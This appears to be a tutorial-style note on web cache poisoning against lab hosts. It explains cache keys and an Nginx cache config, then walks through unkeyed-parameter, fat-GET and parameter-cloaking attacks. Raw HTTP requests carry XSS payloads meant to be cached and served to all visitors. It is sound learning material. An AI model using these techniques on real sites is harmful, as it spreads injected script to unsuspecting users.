# Overview

Web cache is a way to save response from server, so when a user request the same resource, it can just serve the same response again without having to bother the server again.
Web cache use certain parameters in the request to determine if it should serve the same response or fetching new one. These are called **Cache Key**

**Cache Keys** can be parameters like these, including but not limited to:

- `Host:` header
- Scheme like `http://` or `https://`
- Paths like `GET /admin`
- Parameters like `GET /page?language=en`

What is in **cache keys** is called **keyed** parameters, what not is called **unkeyed**

This is how a web cache config looks like in `Nginx`

```
http {
  proxy_cache_path /cache levels=1:2 keys_zone=STATIC:10m inactive=24h max_size=1g;

  server {
    listen       80;

    location / {
      proxy_pass             http://172.17.0.1:80;
      proxy_buffering        on;
      proxy_cache            STATIC;
      proxy_cache_valid      2m;
      proxy_cache_key $scheme$proxy_host$uri$args;
      add_header X-Cache-Status $upstream_cache_status;
    }
  }
}
```

Here is a short explanation of the parameters. For a more detailed overview, have a look at the Nginx documentation [here](https://nginx.org/en/docs/http/ngx_http_proxy_module.html):

- `proxy_cache_path` sets general parameters of the cache, like the storage location
- `proxy_pass` sets the location of the web server to request resource
- `proxy_buffering` enables caching
- `proxy_cache` sets the name of the cache (as defined in `proxy_cache_path`)
- `proxy_cache_valid` sets the time after which the cache expires
- `proxy_cache_key` defines the cache key
- `add_header` adds the `X-Cache-Status` header to responses to indicate whether the response was cached

We can also set the **cache key** to specific GET parameter like this. With this, `http://server.com/?language=en` and `http://server.com/?language=en&param2=2` serves the same response.

```
proxy_cache_key $scheme$proxy_host$uri$arg_language;
```

# Attacks

Most of attacks are basically XSS. But we still have to find an actual XSS vulnerability in the webapp, then poison the cache.

The hard part of finding XSS in with web cache is most of the time we are served a cached response, due to the large number of users. We can try these HTTP header to force hitting the webapp, even if there is a cached response. Most web cache respects this.

- `Cache-Control: no-cache`
- `Pragma: no-cache` This one is deprecated, but we can still try

Still, those are just for testing purposes. When we want to actually poison the cache, we still have to determine the right timing when the cache expire, then send our payload to renew the cache that serves our payload.

Another way we can do this is **cache busting**. We need to find a parameter that no one would input invalid values like `?language=`

```http
GET /index.php?language=invalidValue&ref=something HTTP/1.1
```

And we test XSS on other parameters. Each time we test, **we have to change the value in `?language=` parameter** to always hit the webapp, not the cache server

## Tools

Install if on kali

```sh
sudo apt install web-cache-vulnerability-scanner
```

Otherwise, use `go`

```sh
go install -v github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
```

We can run the tool like this. `-gr` to generate report:

```sh
wcvs -u http://simple.wcp.htb/ -sp language=en -gr
```

The tool can also help us identify more advanced web cache poisoning vulnerabilities that require the exploitation of fat GET requests or parameter cloaking

## Find Unkeyed Parameters

After finding a vulnerability like XSS, we can try to see if the parameter is unkeyed.

So we send this

```http
GET /index.php?language=en&ref=something HTTP/1.1
```

The cache server response with a `MISS`, meaning that this response was never cached before

```http
HTTP/1.1 200 OK
X-Cache-Status: MISS
```

We send the same thing again, to see if it is actually cached, and it is

```http
HTTP/1.1 200 OK
X-Cache-Status: HIT
```

Then we send the same thing with different value in the `ref` parameter like this

```http
GET /index.php?language=en&ref=abc HTTP/1.1
```

And the cache server response with a `HIT`, indicating that this response is cached, meaning that no matter what the `ref=` GET parameter is, it will serve the same cache

```http
HTTP/1.1 200 OK
X-Cache-Status: HIT
```

Now we can exploit it by timing the right moment when the cache expired, we immediately poison the cache

```http
GET /index.php?language=en&ref="><script>alert(1)</script> HTTP/1.1
```

And now whenever someone access `/index.php?language=en`, it will be served a cached page that contains our XSS payload.

## Fat GET

I'm sorry GET. You're not that fat

According to [RFC 7231](https://www.rfc-editor.org/rfc/rfc7231#section-4.3.1), GET request can have a body, but it won't have any effect, so these request are semantically equivalent:

```http
GET /index.php?param1=Hello&param2=World HTTP/1.1
Host: fatget.wcp.htb
```

And this

```http
GET /index.php?param1=Hello&param2=World HTTP/1.1
Host: fatget.wcp.htb
Content-Length: 10

param3=123
```

But depends on the web server config (not the webapp), It will have an effect, which can lead to cache poisoning attack vectors that would otherwise be unexploitable.

Lets take a look. We sent this request, with `language` GET parameter both on the URL and body, but different value. We got a page in German.

```http
GET /index.php?language=en HTTP/1.1
Host: fatget.wcp.htb
Content-Length: 11

language=de
```

Now we need to see if there is a discrepancy between the web cache and the webapp. We send the same request but no body, but we still get a page in German

```http
GET /index.php?language=en HTTP/1.1
Host: fatget.wcp.htb
```

That means there is a discrepancy. We can exploit this by using a **keyed** parameter that is vulnerable to XSS.

```http
GET /index.php?language=en HTTP/1.1
Host: fatget.wcp.htb

ref="><script>alert(1)</script>
```

## Parameter Cloaking

Some web server, like Python web framework [Bottle](https://bottlepy.org/docs/dev/) allows a semicolon (or other special characters) to separate different URL parameters. For example, GET request to `/test?a=1;b=2` means `a=1` and `b=2` for `bottle`, but the web cache might interprets `a` as `1;b=2`

The vulnerability was disclosed under [CVE-2020-28473](https://nvd.nist.gov/vuln/detail/CVE-2020-28473)

Now, let's create a discrepancy between the web cache and the web server. We send a request like this. `a` is an non-functional and unkeyed parameter. We got a German page

```http
GET /?language=en&a=b;language=de HTTP/1.1
Host: cloak.wcp.htb
```

Now let's do that again but only with `?language=en`. We still get a German page. There is a discrepancy between the web cache and the webapp.

The web cache sees `language=en` and `a=b;language=de` parameters.

But the web server sees `language=en`, `a=b` and `language=de`

```http
GET /?language=en HTTP/1.1
Host: cloak.wcp.htb
```

Same rodeo, we exploit XSS and spread it to everyone

```http
GET /?language=de&a=b;ref="><script>alert(1)</script> HTTP/1.1
Host: cloak.wcp.htb
```